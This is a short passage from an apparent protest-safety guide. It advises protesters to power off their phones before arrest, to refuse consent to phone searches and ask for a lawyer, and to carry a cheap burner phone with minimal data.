<p>Even if you’re peaceful and aren’t breaking any laws, police might arrest you at a protest. If you can tell that you’re about to get arrested, and it’s safe to do so, power off your phone. This makes it a lot harder for cops to get into your phone.</p>
<p>Police do not have the right to search your phone without your consent unless they get a warrant. If an officer asks you to unlock your phone, or if they grab your phone from your hands while it’s unlocked, tell them: “I do not consent to a search of my phone. I want to talk to a lawyer.” (It’s OK if you don’t have a lawyer yet, you should still say this.) They may confiscate your phone and illegally search it anyway, but it’s best to make it clear at the moment that you don’t consent.</p>
<p>It’s also possible that cops might try to steal or break your phone, especially if they noticed you filming them being violent. If any of this happens, at least it will just be your cheap burner phone with minimal data on it rather than an expensive phone full of private information about your life and your activism.</p>
